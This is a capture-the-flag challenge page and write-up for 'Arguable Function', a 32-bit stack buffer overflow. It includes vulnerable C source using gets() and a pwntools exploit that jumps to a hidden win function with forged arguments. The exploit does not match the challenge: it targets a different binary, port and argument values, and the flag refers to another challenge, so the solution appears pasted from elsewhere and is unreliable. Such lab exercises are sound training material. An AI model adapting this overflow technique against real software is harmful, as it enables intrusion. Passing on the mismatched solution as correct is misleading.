# Arguable Function

Difficulty Level: Medium
 
Hidden function again, this time with arguments! You can't get the flag now muahaahhahahaha
 
Connect via `nc challenge.ctf-fun.xyz 14009`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- No hints provided


## Deployment

```bash
cd service
sudo ./arguablefunction.sh &
```

## Solution
Looking at the source code, we see that there's a uncallable `win` function that requires the argument `0xCAFE` 

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define FLAGSIZE 64

void win(unsigned int arg1){
	char flag[FLAGSIZE];

	if (arg1 == 0xCAFE) {
		FILE *f = fopen("flag.txt","r");
		if (f == NULL) {
			printf("Flag File is Missing.\n");
			exit(0);
		}

		fgets(flag,FLAGSIZE,f);
		printf(flag);
		}
	else {
		puts("Let this be known... as the time you almost win");
	}

	return;
}


void vulnerable() {
	char buf[100] = {0x00};
	
	gets(buf);
	puts("Try harder hehe");

	return;
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);
	puts("I have added an argument to my win function! You can never run this function now!");
	vulnerable();
	return 0;
}
```

When we call a function normally, it will push the arguments first then a return address is pushed. Similarly, to call a function with argument through buffer overflow we need to mimic a function.

![image1](../screenshots/arguablefunction/image1.png?raw=true "image 1")

```python
"""
This exercise is a build up from the previous exercise where you supply more arguments

for 32 bit programs, when you call a function, the arguments are pushed before calling the function.


| Function parameter 3	|
| Function parameter 2	|
| Function parameter 1	|
| Return Address 		|
| ebp					|

when we want to call a function with paramters we must simulate a normal function call by
adding a fake return address then adding the parameters.

"""

from pwn import *

def main():

	padding = b'A' * 76

	win = p32(0x080491c2)

	arg1 = p32(0xdeadbeef)

	arg2 = p32(0xcafebabe)

	payload = padding + win	+ b"AAAA" + arg1 + arg2

	#io = process('./doubletrouble')
	io = remote("challenge.ctf-fun.xyz", 14010)
	io.sendline(payload)

	io.interactive()

if __name__ == '__main__':
	main()
```

### Flag
19C4{D0ubl3_+h3_fun_4m_i_R1ghT}